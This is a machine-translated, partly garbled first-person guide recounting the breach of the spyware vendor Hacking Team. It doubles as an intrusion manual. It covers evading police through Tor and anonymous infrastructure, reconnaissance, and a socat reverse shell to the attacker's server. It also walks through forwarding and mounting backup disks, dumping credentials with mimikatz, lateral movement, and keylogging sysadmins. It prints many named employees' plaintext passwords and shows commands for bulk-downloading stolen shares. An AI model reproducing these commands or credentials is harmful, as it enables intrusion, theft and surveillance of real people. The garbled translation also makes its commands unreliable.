  | | | | __ _ ___ | | __ | __) __ _ ___ | | _ | |
               | | _ | | / _` | / __ | | / / | _ \ / _` | / __ | | / / |
               | _ | (_ | | (__ | <| | _) | (_ | | (__ | <| _ |
               | _ | | _ | \ __, _ | \ ___ | _ | \ _ \ | ____ / \ __, _ | \ ___ | _ | \ _ (_)
                                                 
                                 A DIY Guide



                                 , -._, -._             
                              _, - \ o O_ /;            
                             /, `` |            
                             | \ -., ___, / `        
                              \ `-.__ / /,. \      
                             / `-.__.- \` ./ \ '
                            / / | ___ \, / `\
                           ((| .- "` '/ \\ `
                            \ \ / ,, | \ _
                             \ | o / o / \.
                              \, / /
                              (__`; -; '__ `) \\
                              `// '` `||` `\
                             _ // || __ _ _ _____ __
                     .- "-._, (__). (__) .-" "-. | | | | | _ _ | |
                    / \ / \ | | | _ | | | | |
                    \ / \ / | | _ | | | |
                     `'-------` `--------'` __ | | _ | | _ | | _ | | __
                               #antisec



- [1 - Introduction] ------------------------------------------- ----------------

You will notice the change of language since the last edition [1]. The speaking world
English already has books, talks, guides, and information to spare about
hacking In that world there are many hackers better than me, but unfortunately
they waste their knowledge working for "defense" contractors,
for intelligence agencies, to protect banks and corporations and
to defend the established order. The hacker culture was born in the USA as a
counterculture, but that origin has remained in the mere aesthetic - the rest has
been assimilated. At least they can wear a T-shirt, dye their hair blue,
use their hacker nicknames, and feel rebellious while they work for the
system.

Before someone had to sneak into the offices to filter documents [2].
A gun was needed to rob a bank. Nowadays you can do it from
the bed with a laptop in his hands [3] [4]. As the CNT said after the
Hacking of Gamma Group: "We will try to take a step further with new
forms of struggle. "[5] Hacking is a powerful tool, let's learn and
fight!

[1] http://pastebin.com/raw.php?i=cRYvK4jb
[2] https://en.wikipedia.org/wiki/Citizens%27_Commission_to_Investigate_the_FBI
[3] http://www.aljazeera.com/news/2015/09/algerian-hacker-hero-hoodlum-150921083914167.html
[4] https://securelist.com/files/2015/02/Carbanak_APT_eng.pdf 
[5] http://madrid.cnt.es/noticia/consideraciones-sobre-el-ataque-informatico-a-gamma-group


- [2 - Hacking Team] ------------------------------------------ ----------------

Hacking Team was a company that helped governments hack and spy on
journalists, activists, political opponents, and other threats to their power
[1] [2] [3] [4] [5] [6] [7] [8] [9] [10] [11]. And, very occasionally, to criminals and
terrorists [12]. Vincenzetti, the CEO, liked to finish his emails with
the fascist slogan "boia chi molla". It would be more successful "boia chi sells RCS".
They also claimed to have technology to solve Tor's "problem" and
darknet [13]. But since I still have my freedom, I have my doubts about
of its effectiveness.

[1] http://www.animalpolitico.com/2015/07/el-gobierno-de-puebla-uso-el-software-de-hacking-team-para-espionaje-politico/
[2] http://www.prensa.com/politica/claves-entender-Hacking-Team-Panama_0_4251324994.html
[3] http://www.24-horas.mx/ecuador-espio-con-hacking-team-a-opositor-carlos-figueroa/
[4] https://citizenlab.org/2012/10/backdoors-are-forever-hacking-team-and-the-targeting-of-dissent/
[5] https://citizenlab.org/2014/02/hacking-team-targeting-ethiopian-journalists/
[6] https://citizenlab.org/2015/03/hacking-team-reloaded-us-based-ethiopian-journalists-targeted-spyware/
[7] http://focusecuador.net/2015/07/08/hacking-team-rodas-paez-tiban-torres-son-espiados-en-ecuador/
[8] http://www.pri.org/stories/2015-07-08/these-ethiopian-journalists-exile-hacking-team-revelations-are-personal
[9] https://theintercept.com/2015/07/07/leaked-documents-confirm-hacking-team-sells-spyware-repressive-countries/
[10] http://www.wired.com/2013/06/spy-tool-sold-to-governments/
[11] http://www.theregister.co.uk/2015/07/13/hacking_team_vietnam_apt/
[12] http://www.ilmessaggero.it/primopiano/cronaca/yara_bossetti_hacking_team-1588888.html
[13] http://motherboard.vice.com/en_ca/read/hacking-team-founder-hey-fbi-we-can-help-you-crack-the-dark-web


- [3 - Be careful out there] ---------------------------------------- ------

Unfortunately, our world is upside down. Enriches you by doing bad things
and imprison you for doing good things. Fortunately, thanks to work
hard of people like those of "Tor project" [1], you can avoid that they put you in the
jail through some simple guidelines:

1) Encrypt your hard drive [2]

   I suppose that by the time the police arrive to seize your computer,
   It will mean that you have already made many mistakes, but it is better to prevent
   what to cure

2) Use a virtual machine and route all traffic through Tor

   This accomplishes two things. First, that all connections are anonymized to
   through the Tor network. Second, maintain personal life and anonymous life
   in different computers it helps you not to mix them by accident.

   You can use projects like Whonix [3], Tails [4], Qubes TorVM [5], or something
   personalized [6]. Here [7] there is a detailed comparison.

3) (Optional) Do not connect directly to the Tor network
   
   Tor is not the panacea. You can correlate the hours you're connected
   to Tor with the hours that your hacker nickname is active. There have also been
   successful attacks against the network [8]. You can connect to the Tor network through
   of other's wifi. Wifislax [9] is a Linux distribution with many
   tools to get wifi. Another option is to connect to a VPN or a
   bridge node [10] before Tor, but it's less secure because it still
   can correlate the activity of the hacker with the activity of the internet
   from your house (this was for example used as evidence against Jeremy Hammond
   [eleven]).

   The reality is that although Tor is not perfect, it works quite well.
   When I was young and reckless, I did many things without any protection (I
   I mean hacking) apart from Tor, that the police did the impossible by
   investigate, and I've never had problems.


[1] https://www.torproject.org/
[2] https://info.securityinabox.org/chapter-4
[3] https://www.whonix.org/
[4] https://tails.boum.org/
[5] https://www.qubes-os.org/doc/privacy/torvm/
[6] https://trac.torproject.org/projects/tor/wiki/doc/TransparentProxy
[7] https://www.whonix.org/wiki/Comparison_with_Others
[8] https://blog.torproject.org/blog/tor-security-advisory-relay-early-traffic-confirmation-attack/
[9] http://www.wifislax.com/
[10] https://www.torproject.org/docs/bridges.html.en
[11] http://www.documentcloud.org/documents/1342115-timeline-correlation-jeremy-hammond-and-anarchaos.html


---- [3.1 - Infrastructure] ----------------------------------------- ----------

I do not hack directly with Tor's output relays. They are on blacklists,
they are very slow, and you can not receive inverse connections. Tor serves to
protect my anonymity while I connect to the infrastructure I use to
hack, which consists of:

1) Domain names

   It serves for command and control (C & C) addresses, and for tunnels for
   DNS for secured egress.

2) Stable Servers

   Serves for C & C servers, to receive reverse shells, to launch
   attacks and to save the booty.

3) Servers Hacked

   They serve as pivots to hide the IP of stable servers, and for
   when I want a quick connection without a pivot. For example, scan ports,
   scan all internet, download a database with sql injection,
   etc.

Obviously you have to pay anonymously, like bitcoin (if you use it with
watch out).


---- [3.2 - Attribution] ----------------------------------------- ---------------

It often comes out in the news that they have attributed an attack to a group of
government hackers (the "APTs"), because they always use the same
tools, leave the same footprints, and even use the same
infrastructure (domains, emails etc). They are negligent because they can hack
without legal consequences.

I did not want to make the work of the police easier and relate the Hacking
Team with the hacks and nicknames of my daily work as a glove hacker
black. So I used servers and new domains, registered with new emails
and paid with new bitcoin addresses. Also, I only used tools
public and things that I wrote especially for this attack and I changed my way
to do some things so as not to leave my normal forensic imprint.


- [4 - Collect Information] ------------------------------------------ ---------

Although it can be tedious, this stage is very important, because the more
large the attack surface, the easier it will be to find a fault in a
part of it.


---- [4.1 - Technical Information] ---------------------------------------- -------

Some tools and techniques are:

1) Google

   You can find many unexpected things with a couple of good searches
   chosen For example, the identity of DPR [1]. The bible of how to use
   Google to hack is the book "Google Hacking for Penetration Testers".
   You can also find a brief summary in Spanish in [2].

2) Enumeration of subdomains

   Often the main domain of a company is hosted by a third party, and
   you will find the IP ranges of the company thanks to subdomains like
   mx.company.com, ns1.company.com etc. Also, sometimes there are things that should not
   be exposed in "hidden" subdomains. Useful tools for
   discover domains and subdomains are fierce [3], theHarvester [4], and
   recon-ng [5].

3) Searches and reverse searches of whois

   With a reverse search using the whois information of a domain or range
   of IPs of a company, you can find others of their domains and ranges of
   IPs. As far as I know, there is no free way to do reverse searches of
   whois, apart from a "hack" with google: 
   
   "via della moscova 13" site: www.findip-address.com
   "via della moscova 13" site: domaintools.com

4) Port scanning and fingerprinting

   Unlike other techniques, it talks to the servers of the
   company. I include it in this section because it is not an attack, it is only for
   collect information. The IDS of the company can generate an alert to
   scan ports, but you do not have to worry because all internet
   is being scanned constantly.

   To scan, nmap [6] is accurate, and you can fingerprint most of
   discovered services. For companies with very long IP ranges,
   zmap [7] or masscan [8] are fast. WhatWeb [9] or BlindElephant [10]
   You can fingerprint websites.

[1] http://www.nytimes.com/2015/12/27/business/dealbook/the-unsung-tax-agent-who-put-a-face-on-the-silk-road.html
[2] http://web.archive.org/web/20140610083726/http://www.soulblack.com.ar/repo/papers/hackeando_con_google.pdf
[3] http://ha.ckers.org/fierce/
[4] https://github.com/laramies/theHarvester
[5] https://bitbucket.org/LaNMaSteR53/recon-ng
[6] https://nmap.org/
[7] https://zmap.io/
[8] https://github.com/robertdavidgraham/masscan
[9] http://www.morningstarsecurity.com/research/whatweb
[10] http://blindelephant.sourceforge.net/


---- [4.2 - Social Information] ---------------------------------------- --------

For social engineering, it is very useful to gather information about the
employees, their roles, contact information, operating system, browser,
plugins, software, etc. Some resources are:

1) Google

   Here, too, is the most useful tool.

2) theHarvester and recon-ng

   I have already mentioned them in the previous section, but they have much more
   functionality You can find a lot of information quickly and
   automated It is worth reading all your documentation.

3) LinkedIn

   You can find a lot of information about the employees here. The
   The company's recruiters are the most likely to accept your requests.

4) Data.com

   Formerly known as jigsaw. Have the contact information of many
   employees.

5) Metadata of the archives

   You can find a lot of information about employees and their systems in
   the metadata of files that the company has published. Useful tools
   to find files on the company's website and extract the
   metadata are metagoofil [1] and FOCA [2].

[1] https://github.com/laramies/metagoofil
[2] https://www.elevenpaths.com/en/labstools/foca-2/index.html


- [5 - Entering the Network] ---------------------------------------- ------------

There are several ways to make the entrance. Since the method I used for hacking
team is rare and much more laborious than is normally necessary,
I'm going to talk a little about the two most common methods, which I recommend trying
First.


---- [5.1 - Social Engineering] ---------------------------------------- ---------

Social engineering, specifically spear phishing, is responsible for the
most hacks today. For an introduction in Spanish, see [1].
For more information in English, see [2] (part three, "Targeted
Attacks ") For funny anecdotes of social engineering of the generations
past, see [3]. I did not want to try spear phishing against Hacking Team,
because his business is to help governments spear phish to his opponents.
Therefore there is a much higher risk that Hacking Team will recognize and
Investigate said attempt.

[1] http://www.hacknbytes.com/2016/01/apt-pentest-con-empire.html
[2] http://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes/
[3] http://www.netcomunity.com/lestertheteacher/doc/ingsocial1.pdf


---- [5.2 - Buy Access] ---------------------------------------- ------------

Thanks to industrious Russians and their exploit kits, traffickers, and
bots pastors, many companies already have computers compromised inside
of your networks. Almost all the Fortune 500, with their huge networks, have
bots already inside. However, Hacking Team is a very small company, and the
Most employees are computer security experts, so there
little likelihood that they were already engaged.


---- [5.3 - Technical Exploitation] ---------------------------------------- -------

After the hacking of Gamma Group, I described a process to search
vulnerabilities [1]. Hacking Team has a public IP range:
inetnum: 93.62.139.32 - 93.62.139.47
descr: HT public subnet

Hacking Team had very little exposed to the internet. For example, different from
Gamma Group, your customer service site needs a certificate from the
client to connect. What he had was his main website (a Joomla blog
in which Joomscan [2] does not reveal any serious failure), a mail server, a
pair of routers, two VPN devices, and a device to filter spam.
Then I had three options: look for a 0day in Joomla, look for a 0day in
postfix, or look for a 0day in one of the embedded systems. A 0day in a
embedded system seemed the most reachable option, and after two weeks
of reverse engineering work, I achieved a remote root exploit. Given the
the vulnerabilities have not yet been patched, I will not give more details.
For more information on how to search for these types of vulnerabilities, see
[3] and [4].

[1] http://pastebin.com/raw.php?i=cRYvK4jb
[2] http://sourceforge.net/projects/joomscan/
[3] http://www.devttys0.com/
[4] https://docs.google.com/presentation/d/1-mtBSka1ktdh8RHxo2Ft0oNNlIp7WmDA2z9zzHpon8A


- [6 - Be Prepared] ------------------------------------------ -------------

I did a lot of work and tests before using the exploit against Hacking Team.
I wrote a firmware with backdoor, and compiled several tools
post-exploitation for the embedded system. The backdoor serves to protect the
exploit. Using the exploit only once and then returning through the backdoor does
more difficult the work of discovering and patching vulnerabilities.

The post-exploitation tools I had prepared were:

1) busybox

   For all common UNIX utilities that the system did not have.

2) nmap

   To scan and fingerprint the internal network of Hacking Team.

3) Responder.py

   The most useful tool to attack Windows networks when you have access to
   the internal network but you do not have a domain user.

4) Python

   To run Responder.py

5) tcpdump

   To sniff traffic.

6) dsniff

   To spy passwords of weak protocols like ftp, and to do
   arpspoofing. I wanted to use ettercap, written by the same ALoR and NaGA of
   Hacking Team, but it was difficult to compile it for the system.

7) socat

   For a comfortable shell with pty:
   my_server: socat file: `tty`, raw, echo = 0 tcp-listen: my_port
   hacked system: socat exec: 'bash -li', pty, stderr, setsid, sigint, sane \
		        tcp: my_server: my_port

   And for many other things, it's a Swiss army knife. See the section on
   examples of your documentation.

8) screen

   Like the socat pty, it's not strictly necessary, but I wanted to feel
   at home in the Hacking Team networks.

9) a SOCKS proxy server

   To use together with proxychains to access the internal network with any
   another program

10) tgcd

   To resend ports, such as the SOCKS server, through the firewall.

[1] https://www.busybox.net/
[2] https://nmap.org/
[3] https://github.com/SpiderLabs/Responder
[4] https://github.com/bendmorris/static-python
[5] http://www.tcpdump.org/
[6] http://www.monkey.org/~dugsong/dsniff/
[7] http://www.dest-unreach.org/socat/
[8] https://www.gnu.org/software/screen/
[9] http://average-coder.blogspot.com/2011/09/simple-socks5-server-in-c.html
[10] http://tgcd.sourceforge.net/


The worst that could happen was that my backdoor or post-exploitation tools
they left the system unstable and had an employee investigate it. By
therefore, I spent a week testing my exploit, backdoor, and tools
post-exploitation in the networks of other vulnerable companies before entering
the Hacking Team network.


- [7 - Observe and Listen] ----------------------------------------- ----------

Now within the internal network, I want to take a look and think before giving
the next step. I turn on Responder.py in analysis mode (-A, to listen without
poisoned answers), and I do a slow scan with nmap.


- [8 - NoSQL Databases] ---------------------------------------- ----------

NoSQL, or rather NoAutentication, has been a great gift to the community
hacker [1]. When I worry that they have finally patched all the failures of
omitting authentication in MySQL [2] [3] [4] [5], new bases become fashionable
of data without authentication by design. Nmap finds a few on the network
Internal Hacking Team:

27017 / tcp open mongodb MongoDB 2.6.5
| mongodb-databases:
| ok = 1
| totalSizeMb = 47547
| totalSize = 49856643072
...
| _ version = 2.6.5

27017 / tcp open mongodb MongoDB 2.6.5
| mongodb-databases:
| ok = 1
| totalSizeMb = 31987
| totalSize = 33540800512
| databases
...
| _ version = 2.6.5

Were the databases for RCS test instances. The audio that records
RCS is saved in MongoDB with GridFS. The audio folder in the torrent [6]
it comes from this. They spied on themselves unintentionally.

[1] https://www.shodan.io/search?query=product%3Amongodb
[2] https://community.rapid7.com/community/metasploit/blog/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql
[3] http://archives.neohapsis.com/archives/vulnwatch/2004-q3/0001.html
[4] http://downloads.securityfocus.com/vulnerabilities/exploits/hoagie_mysql.c
[5] http://archives.neohapsis.com/archives/bugtraq/2000-02/0053.html
[6] https://tra.transparencytoolkit.org/audio/


- [9 - Crossed Cables] ------------------------------------------ -------------

Although it was fun to listen to recordings and see Hacking webcam images
Team developing its malware, it was not very useful. Your insecure copies of
security were the vulnerability that opened its doors. According to his
documentation [1], your iSCSI devices must be in a separate network,
but nmap finds ones in its subnet 192.168.1.200/24:

Nmap scan report for ht-synology.hackingteam.local (192.168.200.66)
...
3260 / tcp open iscsi?
| iscsi-info:
| Target: iqn.2000-01.com.synology: ht-synology.name
| Address: 192.168.200.66:3260,0
| _ Authentication: No authentication required

Nmap scan report for synology-backup.hackingteam.local (192.168.200.72)
...
3260 / tcp open iscsi?
| iscsi-info:
| Target: iqn.2000-01.com.synology: synology-backup.name
| Address: 10.0.1.72:3260,0
| Address: 192.168.200.72:3260,0
| _ Authentication: No authentication required

iSCSI needs a kernel module, and it would have been difficult to compile it for the
Embedded system Resend the port to mount it from a VPS:

VPS: tgcd -L -p 3260 -q 42838
Embedded system: tgcd -C -s 192.168.200.72:3260 -c VPS_IP: 42838

VPS: iscsiadm -m discovery -t sendtargets -p 127.0.0.1

Now iSCSI finds the name iqn.2000-01.com.synology but has problems
at the time of mounting it because it believes that its address is 192.168.200.72 instead of
127.0.0.1

The way I solved it was:
iptables -t nat -A OUTPUT -d 192.168.200.72 -j DNAT --to-destination 127.0.0.1

And now after:
iscsiadm -m node --targetname = iqn.2000-01.com.synology: synology-backup.name -p 192.168.200.72 --login

... the device file appears! We assemble it:
vmfs-fuse -o ro / dev / sdb1 / mnt / tmp

and we found backup copies of several virtual machines. The server
Exchange seems the most interesting. It's too big to download,
but we can mount it remote and look for interesting files:
$ losetup / dev / loop0 Exchange.hackingteam.com-flat.vmdk
$ fdisk -l / dev / loop0
/ dev / loop0p1 2048 1258287103 629142528 7 HPFS / NTFS / exFAT

then the offset is 2048 * 512 = 1048576
$ losetup -o 1048576 / dev / loop1 / dev / loop0
$ mount -o ro / dev / loop1 / mnt / exchange /

now in / mnt / exchange / WindowsImageBackup / EXCHANGE / Backup 2014-10-14 172311
We found the hard drive of the virtual machine, and assembled it:
vdfuse -r -t VHD -f f0f78089-d28a-11e2-a92c-005056996a44.vhd / mnt / vhd-disk /
mount -o loop / mnt / vhd-disk / Partition1 / mnt / part1

... and finally we have unpacked the Russian doll and we can see all the
files from the old Exchange server in / mnt / part1

[1] https://tra.transparencytoolkit.org/FileServer/FileServer/Hackingteam/InfrastrutturaIT/Rete/infrastruttura%20ht.pdf


- [10 - Backup to Domain Administrator] ---------------------

What interests me the most about the backup is to look if you have a
password or hash that you can use to access the current server. Use pwdump,
cachedump, and lsadump [1] with the registry files. lsadump finds the
password of the besadmin service account:

_SC_BlackBerry MDS Connection Service
0000 16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
0010 62 00 65 00 73 00 33 00 32 00 36 00 37 00 38 00 bes3.2.6.7.8.
0020 21 00 21 00 21 00 00 00 00 00 00 00 00 00 00 00!.!.! ...........

I use proxychains [2] with the server socks in the embedded system and
smbclient [3] to check the password:
proxychins smbclient '//192.168.100.51/c$' -U 'hackingteam.local / besadmin% bes32678 !!!'

!Works! The besadmin password is still valid, and is an administrator
local. I use my proxy and psexec_psh from metasploit [4] to get a session
of meterpreter. Then I migrate to a 64-bit process, "load kiwi" [5],
"creds_wdigest", and I already have many passwords, including the administrator's
of the domain:

HACKINGTEAM BESAdmin bes32678 !!!
HACKINGTEAM Administrator uu8dd8ndd12!
HACKINGTEAM c.pozzi P4ssword <---- go sysadmin!
HACKINGTEAM m.romeo ioLK / (90
HACKINGTEAM l.guerra 4luc@=.=
HACKINGTEAM d.martinez W4tudul3sp
HACKINGTEAM g.russo GCBr0s0705!
HACKINGTEAM a.scarafile Cd4432996111
HACKINGTEAM r.viscardi Ht2015!
HACKINGTEAM a.mino A! E $$ andra
HACKINGTEAM m.bettini Ettore & Bella0314
HACKINGTEAM m.luppi Blackou7
HACKINGTEAM s.gallucci 1S9i8m4o!
HACKINGTEAM d.milan set! Dob66
HACKINGTEAM w.furlan Blu3.B3rry!
HACKINGTEAM d.romualdi Rd13136f @ #
HACKINGTEAM l.invernizzi L0r3nz0123!
HACKINGTEAM e.ciceri 2O2571 & 2E
HACKINGTEAM e.rabe erab @ 4HT!

[1] https://github.com/Neohapsis/creddump7
[2] http://proxychains.sourceforge.net/
[3] https://www.samba.org/
[4] http://ns2.elhacker.net/timofonica/manuales/Manual_de_Metasploit_Unleashed.pdf
[5] https://github.com/gentilkiwi/mimikatz


- [11 - Downloading the Post Office] ----------------------------------------- ------

Now that I have the domain administrator password, I have access to
the couriers, the heart of the company. Because with every step that I take there is a
risk of detection, I download the emails before continuing to explore.
Powershell makes it easy [1]. Interestingly, I found a bug with the handling
of dates. After getting the emails, it took me a couple of weeks to
get the source code and everything else, so I came back from time to time to
download new emails. The server was Italian, with dates in the
format day / month / year. Use:
-ContentFilter {(Received -ge '05 / 06/2015 ') -or (Sent -ge '05 / 06/2015')}

with the New-MailboxExportRequest to download the new emails (in this
Case all the mails from June 5. The problem is that it says
that the date is invalid if the day is greater than 12 (I guess this is due to
that in the month the month is first and it can not be a month greater than 12). It seems
that Microsoft engineers have only tested their software with their own
regional configuration.

[1] http://www.stevieg.org/2010/07/using-the-exchange-2010-sp1-mailbox-export-features-for-mass-exports-to-pst/


- [12 - Downloading Files] ------------------------------------------ -------

Now that I am a domain administrator, I also started downloading the
shared resources using my proxy and the -Tc option of smbclient, by
example:

proxymbins smbclient '//192.168.1.230/FAE DiskStation' \
    -U 'HACKINGTEAM / Administrator% uu8dd8ndd12!' -Tc FAE_DiskStation.tar '*'

So I downloaded the folders Amministrazione, FAE DiskStation, and FileServer in
the torrent


- [13 - Introduction to Windows Domain Hacking] -----------------------

Before continuing to tell the story of the Culiaan weones, we can say something about
knowledge to attack Windows networks.


---- [13.1 - Lateral Movement] ---------------------------------------- -------

I will give a brief review of the techniques to spread within a network of
Windows The techniques to run remotely require the password or
hash a local administrator in the goal. By far the most common way
to get these credentials is to use mimikatz [1], especially
sekurlsa :: logonpasswords and sekurlsa :: msv, on computers where you already have
administrative access. The "in situ" movement techniques also require
administrative privileges (except for runes). The most tools
Important for escalation of privileges are PowerUp [2], and bypassuac [3].

[1] https://adsecurity.org/?page_id=1821
[2] https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
[3] https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/privesc/Invoke-BypassUAC.ps1


Remote movement:

1) psexec

   The basic and proven way of movement in windows networks. You can use
   psexec [1], winexe [2], psexec_psh from metasploit [3], invoke_psexec from
   powershell empire [4], or the windows command "sc" [5]. For the module
   metasploit, powershell empire, and pth-winexe [6], just know the hash
   without knowing the password. It is the most universal way (it works in any
   computer with port 445 open), but also the least way
   cautious The type 7045 "Service will appear in the event log
   Control Manager. "In my experience, they have never realized
   hack, but sometimes they notice it later and it helps the researchers understand
   what the hacker has done.

2) WMI

   The most cautious way. The WMI service is enabled in all
   Windows computers, but except for servers, the firewall blocks it
   default. You can use wmiexec.py [7], pth-wmis [6] (here they have a
   demonstration of wmiexec and pth-wmis [8]), invoke_wmi of powershell empire
   [9], or the windows wmic command [5]. All except wmic only need the
   hash

3) PSRemoting [10]

   It is disabled by default, and I do not advise you to enable new ones
   protocols that are not necessary. But if the sysadmin has already enabled it,
   is very convenient, especially if you use powershell for everything (and yes,
   you should use powershell for almost everything, it's going to change [11] with powershell 5
   and windows 10, but nowadays powershell makes it easy to do everything in RAM,
   dodge the antivirus, and leave few fingerprints).

4) Scheduled tasks

   You can run remote programs with at and schtasks [5]. It works in the
   same situations as psexec, and also leaves known traces [12].

5) GPO

   If all these protocols are disabled or blocked by the
   firewall, once you are the domain administrator, you can use GPO
   to give a logon script, install a msi, execute a scheduled task
   [13], or as we will see with Mauro Romeo's computer (Hacking sysadmin
   Team), enable WMI and open the firewall through GPO.

[1] https://technet.microsoft.com/en-us/sysinternals/psexec.aspx
[2] https://sourceforge.net/projects/winexe/
[3] https://www.rapid7.com/db/modules/exploit/windows/smb/psexec_psh
[4] http://www.powershellempire.com/?page_id=523
[5] http://blog.cobaltstrike.com/2014/04/30/lateral-movement-with-high-latency-cc/
[6] https://github.com/byt3bl33d3r/pth-toolkit
[7] https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py
[8] https://www.trustedsec.com/june-2015/no_psexec_needed/
[9] http://www.powershellempire.com/?page_id=124
[10] http://www.maquinasvirtuales.eu/ejecucion-remota-con-powershell/
[11] https://adsecurity.org/?p=2277
[12] https://www.secureworks.com/blog/where-you-at-indicators-of-lateral-movement-using-at-exe-on-windows-7-systems
[13] https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/lateral_movement/new_gpo_immediate_task.py


Movement "in situ":

1) Impersonalizing Tokens

   Once you have administrative access to a computer, you can use the
   tokens of other users to access resources in the domain. Two
   tools to do this are incognito [1] and the commands token :: * of
   mimikatz [2].

2) MS14-068

   You can take advantage of a validation failure in kerberos to generate a
   domain administrator ticket [3] [4] [5].

3) Pass the Hash

   If you have your hash but the user does not have a session started, you can use
   sekurlsa :: pth [2] to obtain a user ticket.

4) Process Injection

   Any RAT can be injected into another process, for example the command
   migrate in meterpreter and pupy [6] or psinject [7] in powershell empire.
   You can inject to the process that has the token that you want.

5) runes

   This is sometimes very useful because it does not require privileges of
   administrator. The command is part of windows, but if you do not have an interface
   graphic you can use powershell [8].

[1] https://www.indetectables.net/viewtopic.php?p=211165
[2] https://adsecurity.org/?page_id=1821
[3] https://github.com/bidord/pykek
[4] https://adsecurity.org/?p=676
[5] http://www.hackplayers.com/2014/12/CVE-2014-6324-como-validarse-con-ciuda-usuario-como-admin.html
[6] https://github.com/n1nj4sec/pupy
[7] http://www.powershellempire.com/?page_id=273
[8] https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps1


---- [13.2 - Persistence] ----------------------------------------- ------------

Once you have access, you want to keep it. Really, persistence
it's just a challenge for bastards like those of Hacking Team who want
Hack activists or other individuals. To hack companies, you do not need
persistence because companies never sleep. I always use "persistence"
Duqu 2 style, run in RAM on a couple of servers with high
uptime percentages. In the hypothetical case that everyone restarts at the same time,
I have passwords and a gold ticket [1] for reserve access. You can read
more information about the persistence mechanisms for windows here
[2] [3] [4]. But to hack companies, it is not necessary and the risk of
detection.

[1] http://blog.cobaltstrike.com/2014/05/14/meterpreter-kiwi-extension-golden-ticket-howto/
[2] http://www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-empire/
[3] http://www.hexacorn.com/blog/category/autostart-persistence/
[4] https://blog.netspi.com/tag/persistence/


---- [13.3 - Internal recognition] ---------------------------------------- ---

The best tool today to understand Windows networks is Powerview [1].
It is worth reading everything written by the author [2], first of all [3], [4], [5], and
[6] Powershell itself is also very powerful [7]. As there are still many
servers 2003 and 2000 without powershell, you have to learn also the old
school [8], with tools like netview.exe [9] or the windows command
"net view" Other techniques that I like are:

1) Download a list of file names

   With a domain administrator account, you can download all the
   File names in the network with powerview:

   Invoke-ShareFinderThreaded -ExcludedShares IPC $, PRINT $, ADMIN $ |
   select-string '^ (. *) \ t-' | % {dir -recurse $ _. Matches [0] .Groups [1] |
   select fullname | out-file -append files.txt}

   Later, you can read it at your own pace and choose which ones you want to download.

2) Read emails

   As we have seen, you can download mails with powershell, and have
   lots of useful information.

3) Read sharepoint

   It is another place where many companies have important information. It can
   download with powershell [10].

4) Active Directory [11]

   It has a lot of useful information about users and computers. Without being
   domain administrator, you can already find a lot of information with
   powerview and other tools [12]. After getting administrator
   domain you should export all AD information with csvde or other
   tool.

5) Spy on employees

   One of my favorite hobbies is hunting the sysadmins. Spying on
   Christan Pozzi (sysadmin of Hacking Team) got access to the server
   Nagios that gave me access to the rete sviluppo (development network with the
   source code of RCS). With a simple combination of Get-Keystrokes and
   Get-TimedScreenshot from PowerSploit [13], Do-Exfiltration from nishang [14], and
   GPO, you can spy on any employee or even the entire domain.

[1] https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView
[2] http://www.harmj0y.net/blog/tag/powerview/
[3] http://www.harmj0y.net/blog/powershell/veil-powerview-a-usage-guide/
[4] http://www.harmj0y.net/blog/redteaming/powerview-2-0/
[5] http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/
[6] http://www.slideshare.net/harmj0y/i-have-the-powerview
[7] https://adsecurity.org/?p=2535
[8] https://www.youtube.com/watch?v=rpwrKhgMd7E
[9] https://github.com/mubix/netview
[10] https://blogs.msdn.microsoft.com/rcormier/2013/03/30/how-to-perform-bulk-downloads-of-files-in-sharepoint/
[11] https://adsecurity.org/?page_id=41
[12] http://www.darkoperator.com/?tag=Active+Directory
[13] https://github.com/PowerShellMafia/PowerSploit
[14] https://github.com/samratashok/nishang


- [14 - Hunting Sysadmins] ------------------------------------------ ----------

When I read the documentation of your infrastructure [1], I realized that I still
lack of access to something important - the "Rete Sviluppo", an isolated network that
save all the RCS source code. The sysadmins of a company always
they have access to everything. I searched the computers of Mauro Romeo and Christian
Pozzi to see how they manage the sviluppo network, and to see if there were other
interesting systems that you should investigate. It was easy to access their
computers since they were part of the windows domain where I had
administrator. Mauro Romeo's computer had no open port,
so I opened the WMI port [2] to execute meterpreter [3]. In addition to
record keys and captures with Get-Keystrokes and Get-TimedScreenshot, I used many
modules / gather / of metasploit, CredMan.ps1 [4], and searched for files [5]. Seeing
that Pozzi had a Truecrypt volume, I waited until I had mounted it for
copy the files then. Many have laughed at the weak passwords
by Christian Pozzi (and Christian Pozzi in general, offers a lot of material
for comedy [6] [7] [8] [9]). I included them in the filtration as an oversight and
to laugh at him. The reality is that mimikatz and keyloggers see all the
Same passwords

[1] http://hacking.technology/Hacked%20Team/FileServer/FileServer/Hackingteam/InfrastrutturaIT/
[2] http://www.hammer-software.com/wmigphowto.shtml
[3] https://www.trustedsec.com/june-2015/no_psexec_needed/
[4] https://gallery.technet.microsoft.com/scriptcenter/PowerShell-Credentials-d44c3cde
[5] http://pwnwiki.io/#!presence/windows/find_files.md
[6] http://archive.is/TbaPy
[7] http://hacking.technology/Hacked%20Team/c.pozzi/screenshots/
[8] http://hacking.technology/Hacked%20Team/c.pozzi/Desktop/you.txt
[9] http://hacking.technology/Hacked%20Team/c.pozzi/credentials/


- [15 - The Bridge] ------------------------------------------ ------------------

Within Christian Pozzi's encrypted volume, there was a textfile with many
passwords [1]. One of them was for a Fully Automated Nagios server,
who had access to the sviluppo network to monitor it. Had found
the bridge I only had the password for the web interface, but there was a
public exploit [2] to execute code and get a shell (it's an exploit
not authenticated, but it is necessary that a user has a session initiated for the
which I used the textfile password).

[1] http://hacking.technology/Hacked%20Team/c.pozzi/Truecrypt%20Volume/Login%20HT.txt
[2] http://seclists.org/fulldisclosure/2014/Oct/78


- [16 - Reusing and restoring passwords] ----------------------------

Reading the emails, I had seen Daniele Milan granting access to
git repositories I already had your windows password thanks to mimikatz. The
I tried with the git server and it worked. I tried sudo and it worked. For him
gitlab server and his twitter account, I used the function "forgot my
password ", and my access to the mail server to reset the
password.


- [17 - Conclusion] ------------------------------------------- ----------------

